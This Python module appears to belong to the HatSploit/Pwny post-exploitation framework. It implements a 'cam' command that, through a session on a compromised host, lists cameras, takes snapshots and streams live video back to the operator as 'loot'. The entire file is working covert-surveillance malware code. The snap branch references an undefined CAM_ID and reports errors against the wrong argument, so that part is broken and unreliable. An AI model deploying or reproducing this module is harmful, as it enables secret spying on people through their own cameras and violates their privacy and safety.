"""
This command requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import os
import sys
import time
import threading

from pwny.api import *
from pwny.types import *

from pex.proto.stream import StreamClient

from badges.cmd import Command

CAM_BASE = 5

CAM_LIST = tlv_custom_tag(API_CALL_STATIC, CAM_BASE, API_CALL)

CAM_PIPE = tlv_custom_pipe(PIPE_STATIC, CAM_BASE, PIPE_TYPE)


class ExternalCommand(Command):
    def __init__(self):
        super().__init__({
            'Category': "gather",
            'Name': "cam",
            'Authors': [
                'Ivan Nikolskiy (enty8080) - command developer'
            ],
            'Description': "Use built-in camera.",
            'MinArgs': 1,
            'Options': [
                (
                    ('-l', '--list'),
                    {
                        'help': "List available camera devices.",
                        'action': 'store_true'
                    }
                ),
                (
                    ('-s', '--snap'),
                    {
                        'help': "Take a snapshot from device.",
                        'metavar': 'ID',
                        'type': int
                    }
                ),
                (
                    ('-S', '--stream'),
                    {
                        'help': "Stream selected device.",
                        'metavar': 'ID',
                        'type': int
                    }
                ),
                (
                    ('-L',),
                    {
                        'help': "List actively streaming devices.",
                        'dest': 'streams',
                        'action': 'store_true'
                    }
                ),
                (
                    ('-c', '--close'),
                    {
                        'help': "Close all streams for device.",
                        'metavar': 'ID',
                        'type': int
                    }
                ),
                (
                    ('-o', '--output'),
                    {
                        'help': "Local file to save snapshot to.",
                        'metavar': 'FILE'
                    }
                )
            ]
        })

        self.running = {}

    def read_thread(self, path, device):
        while True:
            stream = self.running.get(device, None)

            if not stream:
                break

            frame = self.session.pipes.readall_pipe(
                pipe_type=CAM_PIPE,
                pipe_id=stream['ID']
            )

            try:
                with open(path, 'wb') as f:
                    f.write(frame)

            except Exception:
                self.print_error(f"Failed to write image to {path}!")

    def run(self, args):
        if args.streams:
            data = []

            for device, stream in self.running.items():
                data.append((device, stream['Stream'].path,
                             stream['Stream'].image))

            if not data:
                self.print_warning('No active streams running.')
                return

            self.print_table('Active streams', ('ID', 'Path', 'Image'), *data)

        elif args.close:
            stream = self.running.get(args.close, None)

            if not stream:
                self.print_error(f"Device #{str(args.close)} not streaming!")
                return

            self.running.pop(args.close, None)

            self.print_process(f"Suspending device #{str(args.close)}...")
            stream['Thread'].join()

            self.session.pipes.destroy_pipe(CAM_PIPE, stream['ID'])
            self.session.loot.remove_loot(stream['Stream'].image)
            self.session.loot.remove_loot(stream['Stream'].path)

        elif args.stream:
            stream = self.running.get(args.stream, None)

            if stream:
                self.print_warning(f"Device #{str(args.stream)} is already streaming.")

                stream['Stream'].stream()
                return

            try:
                pipe_id = self.session.pipes.create_pipe(
                    pipe_type=CAM_PIPE,
                    args={
                        TLV_TYPE_INT: args.stream - 1
                    }
                )

            except RuntimeError:
                self.print_error(f"Failed to open device #{str(args.stream)}!")
                return

            self.print_process(f"Streaming device #{str(args.stream)}...")

            file = self.session.loot.random_loot('png')
            path = self.session.loot.random_loot('html')

            client = StreamClient(path=path, image=file)
            client.create_video()

            thread = threading.Thread(target=self.read_thread, args=(file, args.stream))
            thread.setDaemon(True)

            self.running.update({
                args.stream: {
                    'Stream': client,
                    'ID': pipe_id,
                    'Thread': thread
                }
            })

            thread.start()
            client.stream()

        elif args.list:
            result = self.session.send_command(
                tag=CAM_LIST
            )

            device = result.get_string(TLV_TYPE_STRING)
            id = 1

            while device:
                self.print_information(f"{str(id): <4}: {device}")
                id += 1

                device = result.get_string(TLV_TYPE_STRING)

        elif args.snap:
            try:
                pipe_id = self.session.pipes.create_pipe(
                    pipe_type=CAM_PIPE,
                    args={
                        CAM_ID: args.snap - 1
                    }
                )

            except RuntimeError:
                self.print_error(f"Failed to open device #{str(args.stream)}!")
                return

            output = args.output or self.session.loot.random_loot('png')

            try:
                with open(output, 'wb') as f:
                    f.write(
                        self.session.pipes.readall_pipe(
                            pipe_type=CAM_PIPE,
                            pipe_id=pipe_id
                        )
                    )
                    self.print_success(f"Saved image to {output}!")

            except Exception:
                self.print_error(f"Failed to write image to {output}!")

            self.session.pipes.destroy_pipe(CAM_PIPE, pipe_id)
